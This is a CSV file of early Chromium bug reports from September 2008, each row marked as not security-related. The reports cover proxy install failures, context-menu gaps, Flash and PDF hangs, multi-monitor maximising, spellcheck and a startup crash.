,id,issue_id,date,report,Security,summary,description
200,200,203,2-Sep-08,Issue 203 : Google chrome not install on Proxy Network 5 problem? 1. Configure Firefox ou IE to access internet with a network proxy (Authenticated Proxy) 2. Try install Google Chrome 3. The installer try install  but donÃÂ´t make anything  ? I expect the installer ask me my Proxy User and Password and continue the install.  ? Nothing     My network proxy: 192.168.1.1 port: 80 My user: ************* My Password: *********** ,0,Issue 203 : Google chrome not install on Proxy Network 5 problem,1. Configure Firefox ou IE to access internet with a network proxy (Authenticated Proxy) 2. Try install Google Chrome 3. The installer try install  but donÃÂ´t make anything   I expect the installer ask me my Proxy User and Password and continue the install.   Nothing     My network proxy: 192.168.1.1 port: 80 My user: ************* My Password: *********** 
201,201,204,2-Sep-08,Issue 204 : Reload not in Rightclick-menu 9 problem? 1. Open any Website 2. Click right to see the context menu 3.  ? A menu point giving you the option to reload the page appears in the menu.  ? Said menu point doesn't appear. It is at the top of the tabbar only and pointing and clicking up there is really a bother.     ,0,Issue 204 : Reload not in Rightclick-menu 9 problem,1. Open any Website 2. Click right to see the context menu 3.   A menu point giving you the option to reload the page appears in the menu.   Said menu point doesn't appear. It is at the top of the tabbar only and pointing and clicking up there is really a bother.     
202,202,205,2-Sep-08,Issue 205 : Full screen link doesn't load flash always 3 problem? 1. Go to: &quot; http://www.adobe.com/products/flashpaper/examples/ &quot; 2. Inside the demo FlashPaper click full screen button 3. New tab opens but does not load the .swf 4. To load it: click inside the address bar en hit enter  ?  ?     ,0,Issue 205 : Full screen link doesn't load flash always 3 problem,1. Go to: &quot http://www.adobe.com/products/flashpaper/examples/ &quot 2. Inside the demo FlashPaper click full screen button 3. New tab opens but does not load the .swf 4. To load it: click inside the address bar en hit enter    
203,203,206,2-Sep-08,Issue 206 : Browser hangs while accessing PDF documents 17 problem? 1. if you open a pdf file 2. 3.  ? it should easily open a pdf file.  ? it freezes with the pdf files     ,0,Issue 206 : Browser hangs while accessing PDF documents 17 problem,1. if you open a pdf file 2. 3.   it should easily open a pdf file.   it freezes with the pdf files     
204,204,207,2-Sep-08,Issue 207 : Install behind Authenticating Proxy fails 2 problem? 1. Use an authenticating proxy  (i.e. Squid) 2. Try and install Google Chrome behind this proxy.  ? It needs to be able to run the installer  but it can't  because it can't get past the proxy. There are no configuarable settings to fix this.  ? The install fails on the trying to connect to the internet bit at the very beginning  and won't get any further. I suggest that you provide a setting in the installer to enter in relevant proxy addresses  and passwords. This way  it can be installed in a corporate environment. ,0,Issue 207 : Install behind Authenticating Proxy fails 2 problem,1. Use an authenticating proxy  (i.e. Squid) 2. Try and install Google Chrome behind this proxy.   It needs to be able to run the installer  but it can't  because it can't get past the proxy. There are no configuarable settings to fix this.   The install fails on the trying to connect to the internet bit at the very beginning  and won't get any further. I suggest that you provide a setting in the installer to enter in relevant proxy addresses  and passwords. This way  it can be installed in a corporate environment. 
205,205,208,2-Sep-08,Issue 208 : Problem maximizing on a 2-headed system 2 problem? 1. Run the browser in a system with 2 screens with each using a different resolution  eg 1280x1024 and 1024x768  try to maximize on the small screen  and it maximizes as if it was on the 1st  bigger screen.  ? To maximize properly in the 2nd screen  that is to 1024x768 in my example.  ? It gets the size of the maximize as if it was on the first bigger screen.     ,0,Issue 208 : Problem maximizing on a 2-headed system 2 problem,1. Run the browser in a system with 2 screens with each using a different resolution  eg 1280x1024 and 1024x768  try to maximize on the small screen  and it maximizes as if it was on the 1st  bigger screen.   To maximize properly in the 2nd screen  that is to 1024x768 in my example.   It gets the size of the maximize as if it was on the first bigger screen.     
206,206,209,2-Sep-08,Issue 209 : Pressing TAB does not move to the next item in the address bar results 10 problem? 1. Begin to type a URL in the address bar. 2. Press TAB after the suggestion list appears.  ? Move to the next result in the dropdown list  ? The dropdown list closes and focus moves somewhere indeterminate.     ,0,Issue 209 : Pressing TAB does not move to the next item in the address bar results 10 problem,1. Begin to type a URL in the address bar. 2. Press TAB after the suggestion list appears.   Move to the next result in the dropdown list   The dropdown list closes and focus moves somewhere indeterminate.     
207,207,210,2-Sep-08,Issue 210 : &quot;Web page temporarily not available&quot; issue 14 problem? 1. Try to reach some web page not available at the moment.  ? Something like &quot;The web page at &lt;address&gt; might be temporarily down or it may have moved permanently to a new web address.&quot;  ? Displays: The web page at null might be temporarily down or it may have moved permanently to a new web address.     ,0,Issue 210 : &quotWeb page temporarily not available&quot,issue 14 problem 1. Try to reach some web page not available at the moment.   Something like &quot The web page at &lt address&gt might be temporarily down or it may have moved permanently to a new web address.&quot  Displays: The web page at null might be temporarily down or it may have moved permanently to a new web address.     
208,208,211,2-Sep-08,Issue 211 : PNG background image shadows produce gray background 1 person starred this issue and may be notified of changes.   &nbsp;   ninjainvisible      : 0.2.149.27 (1583) URLs (if applicable) : http://reigngame.com (login restricted)   Below  : Safari 3: OK Firefox 3: OK IE 7: OK  ? 1. PNG with transparency as background image (with shadows if possible) 2. Add opacity to the element or parent element  ? Perfectly crisp shadows around the corners of the PNGs  ? Look at sides of images: IE6 stereotypical gray on exterior     reignyd3.jpg 225 KB &nbsp; View &nbsp; Download ,0,Issue 211 : PNG background image shadows produce gray background 1 person starred this issue and may be notified of changes.   &nbsp,ninjainvisible      : 0.2.149.27 (1583) URLs (if applicable) : http://reigngame.com (login restricted)   Below  : Safari 3: OK Firefox 3: OK IE 7: OK   1. PNG with transparency as background image (with shadows if possible) 2. Add opacity to the element or parent element   Perfectly crisp shadows around the corners of the PNGs   Look at sides of images: IE6 stereotypical gray on exterior     reignyd3.jpg 225 KB &nbsp View &nbsp Download 
209,209,212,2-Sep-08,Issue 212 : scrolling problem in laptop 1 person starred this issue and may be notified of changes.   &nbsp;   rohit.rangera      : &lt;see about:version&gt; URLs (if applicable) :    : Safari 3: OK Firefox 3: OK IE 7: OK  ? 1. open any long page in chrome browser in laptop. 2. use your mouse pad to scroll  it will come down. 3. try to go up with the same mouse pad  without using keys or scroll bar. 4. you can't go up.  ? You have to use up key or scroll bar.  ? mouse pad scroll doesn't work.     ,0,Issue 212 : scrolling problem in laptop 1 person starred this issue and may be notified of changes.   &nbsp,rohit.rangera      : &lt see about:version&gt URLs (if applicable) :    : Safari 3: OK Firefox 3: OK IE 7: OK   1. open any long page in chrome browser in laptop. 2. use your mouse pad to scroll  it will come down. 3. try to go up with the same mouse pad  without using keys or scroll bar. 4. you can't go up.   You have to use up key or scroll bar.   mouse pad scroll doesn't work.     
210,210,214,2-Sep-08,Issue 214 : http://www.google.co/ 1 person starred this issue and may be notified of changes.   &nbsp;   ramyakarth    Awesome work...Keep it up..Ramya R... I love google   : &lt;see about:version&gt; URLs (if applicable) : http://www.google.co/   IE Firefox  : Safari 3: not tested Firefox 3: OK IE 7: OK  ? 1. type http://www.google.co/ and Enter 2. It doesn't display anything 3. shows waiting for cache at the bottom and shows the page loading at the top. 4. The other browsers display: page cannot be displayed- IE Address Not Found - Firefox  ? The browser could not find the host server for the provided address.  ? Shows the page loading sign and keeps processing the page.     with Save Page option I couldn't save/attach the page with this bug. ,0,Issue 214 : http://www.google.co/ 1 person starred this issue and may be notified of changes.   &nbsp,ramyakarth    Awesome work...Keep it up..Ramya R... I love google   : &lt see about:version&gt URLs (if applicable) : http://www.google.co/   IE Firefox  : Safari 3: not tested Firefox 3: OK IE 7: OK   1. type http://www.google.co/ and Enter 2. It doesn't display anything 3. shows waiting for cache at the bottom and shows the page loading at the top. 4. The other browsers display: page cannot be displayed- IE Address Not Found - Firefox   The browser could not find the host server for the provided address.   Shows the page loading sign and keeps processing the page.     with Save Page option I couldn't save/attach the page with this bug. 
211,211,215,2-Sep-08,Issue 215 : Spellcheck - no add to dictionary option 14 problem? 1. Type Google into the comments box below 2. Notice that it get a red underline from the spell checker 3. Right click to try to add to dictionary  notice that there is not option for this.  ? You should be able to add words to your spellcheck dictionary.  ? You can't.     ,0,Issue 215 : Spellcheck - no add to dictionary option 14 problem,1. Type Google into the comments box below 2. Notice that it get a red underline from the spell checker 3. Right click to try to add to dictionary  notice that there is not option for this.   You should be able to add words to your spellcheck dictionary.   You can't.     
212,212,216,2-Sep-08,Issue 216 : Application failed to initialize properly (0x0000005). 1 person starred this issue and may be notified of changes.   &nbsp;   jimcoxone      : &lt;see about:version&gt; URLs (if applicable) :    : Safari 3: NA Firefox 3: NA IE 7: NA  ? 1. Install Chrome with XP SP3 2. Start Chrome 3. Get error &quot;Application failed to initialize properly (0x0000005)&quot; - see attached  ? N/A  ? N/A     Chrome error.docx 112 KB &nbsp; Download ,0,Issue 216 : Application failed to initialize properly (0x0000005). 1 person starred this issue and may be notified of changes.   &nbsp,jimcoxone      : &lt see about:version&gt URLs (if applicable) :    : Safari 3: NA Firefox 3: NA IE 7: NA   1. Install Chrome with XP SP3 2. Start Chrome 3. Get error &quot Application failed to initialize properly (0x0000005)&quot - see attached   N/A   N/A     Chrome error.docx 112 KB &nbsp Download 
